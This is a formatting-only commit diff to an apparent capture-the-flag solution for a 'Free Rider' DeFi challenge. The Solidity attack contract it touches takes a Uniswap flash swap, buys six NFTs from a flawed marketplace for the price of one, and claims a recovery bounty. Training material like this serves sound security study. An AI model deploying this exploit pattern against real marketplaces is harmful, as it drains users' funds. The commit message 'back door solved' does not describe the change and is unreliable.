fix: back door solved

+++ test/free-rider/FreeRider.t.sol
@@ -36,15 +36,15 @@ contract AttackMarketplace is IERC721Receiver {
         i_player = msg.sender;
     }
 
-    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         require(msg.sender == address(i_pair), "Incorrect caller");
         require(sender == address(this), "Callee is not the this contract");
-        (uint256 borrowed, ) = abi.decode(data, (uint256, string));
+        (uint256 borrowed,) = abi.decode(data, (uint256, string));
         require(amount0 == borrowed, "Borrowed amount mismatch");
         require(amount1 == 0, "Other token not borrowed");
         i_weth.withdraw(borrowed);
         uint256[] memory ids = new uint256[](6);
-        for(uint i = 0 ; i < 6 ; i++){
+        for (uint256 i = 0; i < 6; i++) {
             ids[i] = i;
         }
         i_marketPlace.buyMany{value: borrowed}(ids);
@@ -55,9 +55,9 @@ contract AttackMarketplace is IERC721Receiver {
     function attack() external {
         bytes memory data = abi.encode(15 ether, "buy nft");
         i_pair.swap(15 ether, 0, address(this), data);
-        (bool success, ) = i_player.call{value: address(this).balance}("");
+        (bool success,) = i_player.call{value: address(this).balance}("");
         (success);
-        for(uint256 i = 0 ; i < 6 ; i++){
+        for (uint256 i = 0; i < 6; i++) {
             i_token.transferFrom(address(this), i_player, i);
         }
     }
@@ -181,12 +181,10 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        AttackMarketplace attackContract = new AttackMarketplace(
-            marketplace, recoveryManager, nft, weth, uniswapPair
-        );
+        AttackMarketplace attackContract = new AttackMarketplace(marketplace, recoveryManager, nft, weth, uniswapPair);
         attackContract.attack();
         bytes memory data = abi.encode(player);
-        for(uint i = 0 ; i < AMOUNT_OF_NFTS; i++){
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
             nft.safeTransferFrom(player, address(recoveryManager), i, data);
         }
     }
